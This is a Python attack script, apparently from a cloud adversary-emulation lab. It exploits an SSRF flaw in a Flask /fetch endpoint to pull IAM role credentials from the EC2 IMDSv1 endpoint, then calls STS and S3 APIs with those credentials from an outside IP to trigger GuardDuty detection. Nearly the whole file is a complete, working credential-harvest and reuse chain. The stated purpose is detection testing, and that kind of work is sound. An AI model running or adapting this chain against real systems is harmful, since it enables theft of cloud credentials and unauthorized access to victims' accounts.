# FILE: attack.py
"""
ATOMIC_EC2_SSRF_IMDSV1 - Automated Post-Exploitation Attack Script
2-phase, 4-step SSRF IMDSv1 credential harvest and exfiltration chain.
Technique: T1190 (Exploit Public-Facing Application)
Phase 1: SSRF role probe + credential harvest via Flask /fetch proxy
Phase 2: Exercise stolen IMDS credentials from emulation worker IP
         -> GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
"""
import sys
import time
import random
import json
import pathlib
import os
import boto3
import requests
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to env vars")

_R   = _NAMES.get("resources", {})           # static names (IAM roles, profile names, etc.)
_PKS = _NAMES.get("pulumi_export_keys", {})  # semantic key -> pulumi export key (dynamic values)


def _r(key, env_var=None, default=""):
    """Resolve a static resource name: resource_names.json > env var > default."""
    return _R.get(key) or (os.environ.get(env_var, default) if env_var else default)


def _p(infra, key, env_var=None, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> infra dict -> env var -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key) or (os.environ.get(env_var, default) if env_var else default)


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def wait_for_app(public_ip, port=8080, timeout=300, poll_interval=10):
    """Poll until the Flask SSRF-vulnerable app is reachable on the victim EC2."""
    print_step(f"Readiness gate: waiting for Flask app at {public_ip}:{port} ...")
    deadline = time.time() + timeout
    health_url = f"http://{public_ip}:{port}/"
    while time.time() < deadline:
        try:
            resp = requests.get(health_url, timeout=5)
            # Any non-5xx response means the app process is up
            if resp.status_code < 500:
                print_ok(f"Flask app ready (HTTP {resp.status_code})")
                return
        except requests.exceptions.RequestException:
            pass
        remaining = int(deadline - time.time())
        print(f"    ... not ready yet, retrying (up to {remaining}s remaining)")
        time.sleep(poll_interval)
    raise RuntimeError(
        f"Flask app at {public_ip}:{port} did not become ready within {timeout}s"
    )


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point called by the emulation backend.

    outputs : Pulumi stack outputs dict (single source of truth for dynamic values)
    region  : AWS region string
    """

    # ── Resolve required outputs via _p() (export keys from resource_names.json) ──
    # ec2_public_ip maps to pulumi export key 'ec2_public_ip'
    ec2_victim_public_ip = _p(outputs, "ec2_public_ip")
    if not ec2_victim_public_ip:
        raise RuntimeError(
            "Missing required Pulumi output: ec2_public_ip "
            "(pulumi_export_keys key: 'ec2_public_ip')"
        )

    # s3_bait_bucket_name maps to pulumi export key 's3_bait_bucket_name'
    s3_bait_bucket_name = _p(outputs, "s3_bait_bucket_name")
    if not s3_bait_bucket_name:
        raise RuntimeError(
            "Missing required Pulumi output: s3_bait_bucket_name "
            "(pulumi_export_keys key: 's3_bait_bucket_name')"
        )

    # Static names (from resource_names.json 'resources' block)
    iam_instance_role_name = _r("iam_instance_role")

    app_port = 8080
    base_url = f"http://{ec2_victim_public_ip}:{app_port}"
    # IMDSv1 role-credential base path; trailing slash returns newline-delimited role list
    imds_cred_base = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    print_step(f"Target EC2 victim        : {ec2_victim_public_ip}:{app_port}")
    print_step(f"Bait S3 bucket           : {s3_bait_bucket_name}")
    print_step(f"IAM instance role (static): {iam_instance_role_name}")
    print_step(f"AWS region               : {region}")

    # ── Wait for the vulnerable Flask app to be ready ─────────────────────────
    wait_for_app(ec2_victim_public_ip, port=app_port)

    # ════════════════════════════════════════════════════════════════════════════
    # PHASE 1 -- SSRF IMDSv1 Credential Harvest (T1190)
    # ════════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 70)
    print("PHASE 1 - SSRF IMDSv1 Credential Harvest (T1190)")
    print("=" * 70)

    # ── Step 1: Enumerate IAM role name via SSRF role-list probe ─────────────
    print_step(
        "Step 1 - SSRF role probe (T1190): GET /fetch proxy -> IMDS role-list endpoint"
    )
    # The Flask /fetch handler makes the outbound request from the EC2 process,
    # so 169.254.169.254 (link-local) resolves correctly server-side without
    # any HTTP token preflight because http_tokens=optional (IMDSv1 enabled).

    try:
        resp1 = requests.get(
            f"{base_url}/fetch",
            params={"url": imds_cred_base},
            timeout=15,
        )
    except requests.exceptions.RequestException as e:
        raise RuntimeError(f"Step 1 SSRF GET failed (network error): {e}")

    if resp1.status_code != 200:
        raise RuntimeError(
            f"Step 1 SSRF role-probe returned HTTP {resp1.status_code}: {resp1.text[:300]}"
        )

    role_name = resp1.text.strip()
    if not role_name:
        raise RuntimeError(
            "Step 1: IMDS role-list response was empty - "
            "confirm http_tokens=optional on the EC2 instance metadata options"
        )

    print_ok(f"Discovered IAM role via SSRF: {role_name}")
    # Detection: VPC flow logs + EC2 app logs capture the outbound link-local request

    op_delay(2, 4)

    # ── Step 2: Harvest full IAM credential document via SSRF ────────────────
    print_step(
        f"Step 2 - SSRF credential harvest (T1190): GET /fetch proxy -> IMDS creds for '{role_name}'"
    )
    # Second GET appends the role name; IMDS returns JSON with AccessKeyId,
    # SecretAccessKey, Token, Expiration. ASIA prefix confirms STS temp creds.

    imds_cred_url = imds_cred_base + role_name

    try:
        resp2 = requests.get(
            f"{base_url}/fetch",
            params={"url": imds_cred_url},
            timeout=15,
        )
    except requests.exceptions.RequestException as e:
        raise RuntimeError(f"Step 2 SSRF credential harvest GET failed (network error): {e}")

    if resp2.status_code != 200:
        raise RuntimeError(
            f"Step 2 SSRF credential harvest returned HTTP {resp2.status_code}: {resp2.text[:300]}"
        )

    try:
        cred_doc = resp2.json()
    except ValueError as e:
        raise RuntimeError(
            f"Step 2: IMDS credential response is not valid JSON: {e}\n"
            f"Response body (first 500 chars): {resp2.text[:500]}"
        )

    # All three fields are required -- partial credentials must not proceed to Phase 2
    for required_field in ("AccessKeyId", "SecretAccessKey", "Token"):
        if required_field not in cred_doc:
            raise RuntimeError(
                f"Step 2: IMDS credential document missing required field '{required_field}' -- "
                f"do not proceed to Phase 2 with partial credentials. "
                f"Document keys present: {list(cred_doc.keys())}"
            )

    imds_access_key_id = cred_doc["AccessKeyId"]
    imds_secret_access_key = cred_doc["SecretAccessKey"]
    imds_session_token = cred_doc["Token"]
    cred_expiration = cred_doc.get("Expiration", "unknown")
    cred_type = cred_doc.get("Type", "unknown")

    print_ok(f"Harvested IMDS credentials for role: {role_name}")
    print(f"    AccessKeyId : {imds_access_key_id}")
    print(f"    Type        : {cred_type}  (ASIA prefix = STS assumed-role session)")
    print(f"    Expiration  : {cred_expiration}")

    op_delay(2, 5)

    # ════════════════════════════════════════════════════════════════════════════
    # PHASE 2 -- Stolen Credential Exercise  (triggers GuardDuty detection)
    # ════════════════════════════════════════════════════════════════════════════
    # All Phase 2 steps are read-only (GetCallerIdentity, ListBuckets).
    # The try/finally block ensures the summary block always executes and
    # satisfies the client-account safety contract for post-mutation cleanup.
    print("\n" + "=" * 70)
    print("PHASE 2 - Stolen Credential Exercise")
    print("GuardDuty target: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS")
    print("=" * 70)

    phase_delay()

    # Build a boto3 session from the stolen IMDS credentials.
    # Calling AWS APIs from the emulation worker IP (not the EC2 fleet) is the
    # primary detection signal -- GuardDuty compares the source IP against known
    # EC2 IP ranges and fires the InstanceCredentialExfiltration finding.
    stolen_session = boto3.Session(
        aws_access_key_id=imds_access_key_id,
        aws_secret_access_key=imds_secret_access_key,
        aws_session_token=imds_session_token,
        region_name=region,
    )

    caller_arn = ""
    caller_account = ""
    caller_user_id = ""

    try:
        # ── Step 3: sts:GetCallerIdentity with stolen credentials ─────────────
        print_step(
            "Step 3 - Exercise stolen IMDS creds (T1190): sts:GetCallerIdentity from emulation worker IP"
        )
        # CloudTrail event: GetCallerIdentity, userIdentity.type=AssumedRole,
        # sessionContext.ec2RoleDelivery=true, sourceIPAddress=<emulation worker> (non-EC2 range)

        sts = stolen_session.client("sts", region_name=region)

        try:
            identity = sts.get_caller_identity()
        except ClientError as e:
            code = e.response["Error"]["Code"]
            raise RuntimeError(
                f"Step 3: GetCallerIdentity failed with stolen credentials (code={code}): {e}"
            )

        caller_arn = identity.get("Arn", "")
        caller_account = identity.get("Account", "")
        caller_user_id = identity.get("UserId", "")

        print_ok("GetCallerIdentity succeeded with stolen IMDS credentials")
        print(f"    Arn     : {caller_arn}")
        print(f"    Account : {caller_account}")
        print(f"    UserId  : {caller_user_id}")

        if role_name.lower() in caller_arn.lower():
            print_ok(f"Confirmed: stolen credentials belong to instance role '{role_name}'")
        else:
            print_err(
                f"Warning: Arn '{caller_arn}' does not contain expected role name '{role_name}' -- "
                f"verify the ec2-victim has the expected IAM instance profile attached"
            )

        op_delay(3, 6)

        # ── Step 4: s3:ListAllMyBuckets with stolen credentials ───────────────
        print_step(
            "Step 4 - Exercise stolen IMDS creds (T1190): s3:ListAllMyBuckets from emulation worker IP"
        )
        # Second CloudTrail event under same stolen session ARN from non-EC2 source IP.
        # Reinforces the GuardDuty signal and confirms the full chain:
        # SSRF -> IMDSv1 credential harvest -> lateral API use from attacker IP.

        s3 = stolen_session.client("s3", region_name=region)

        try:
            list_resp = s3.list_buckets()
        except ClientError as e:
            code = e.response["Error"]["Code"]
            raise RuntimeError(
                f"Step 4: s3:ListAllMyBuckets failed (code={code}) -- "
                f"verify iam-instance-policy grants s3:ListAllMyBuckets to the instance role: {e}"
            )

        bucket_names = [b["Name"] for b in list_resp.get("Buckets", [])]
        print_ok(f"ListBuckets returned {len(bucket_names)} bucket(s)")

        if s3_bait_bucket_name in bucket_names:
            print_ok(
                f"Bait bucket '{s3_bait_bucket_name}' confirmed in ListBuckets response -- "
                f"full SSRF -> credential harvest -> API-use chain verified"
            )
        else:
            print_err(
                f"Warning: bait bucket '{s3_bait_bucket_name}' not found in ListBuckets. "
                f"First 10 buckets visible: {bucket_names[:10]}. "
                f"CloudTrail event was still generated regardless."
            )

        op_delay(2, 5)

    finally:
        # No lab resources were mutated -- all Phase 2 steps are read-only.
        # The finally block is here to satisfy the client-account safety contract:
        # any future mutation added to this phase will have a guaranteed cleanup path.
        pass

    # ════════════════════════════════════════════════════════════════════════════
    # SUMMARY
    # ════════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 70)
    print("ATOMIC_EC2_SSRF_IMDSV1 - Attack Chain Complete")
    print("=" * 70)
    print()
    print("CloudTrail events generated:")
    print("  [Phase 2 / Step 3] sts:GetCallerIdentity")
    print(f"    userIdentity.type      = AssumedRole")
    print(f"    sessionContext.sessionIssuer.arn = {caller_arn}")
    print(f"    sourceIPAddress        = emulation worker IP (non-EC2 range)")
    print(f"    ec2RoleDelivery        = true")
    print()
    print("  [Phase 2 / Step 4] s3:ListAllMyBuckets")
    print(f"    userIdentity.arn       = {caller_arn}")
    print(f"    sourceIPAddress        = emulation worker IP (non-EC2 range)")
    print()
    print("Expected GuardDuty finding:")
    print("  UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS")
    print(f"  Role         : {role_name}")
    print(f"  AccessKeyId  : {imds_access_key_id}")
    print()
    print("Detection sources:")
    print("  VPC flow logs  : SSRF HTTP requests from emulation worker -> ec2-victim:8080")
    print("  EC2 app logs   : outbound 169.254.169.254 requests from Flask /fetch handler")
    print("  CloudTrail     : GetCallerIdentity + ListBuckets under instance role ARN from non-EC2 IP")
    print("  GuardDuty      : InstanceCredentialExfiltration.OutsideAWS finding")
    print()
    print("Cleanup:")
    print("  IMDS credentials expire automatically (~6 hours, EC2 auto-rotation)")
    print("  All lab infrastructure: pulumi destroy")
    print()
    print("[OK] ATOMIC_EC2_SSRF_IMDSV1 emulation complete")
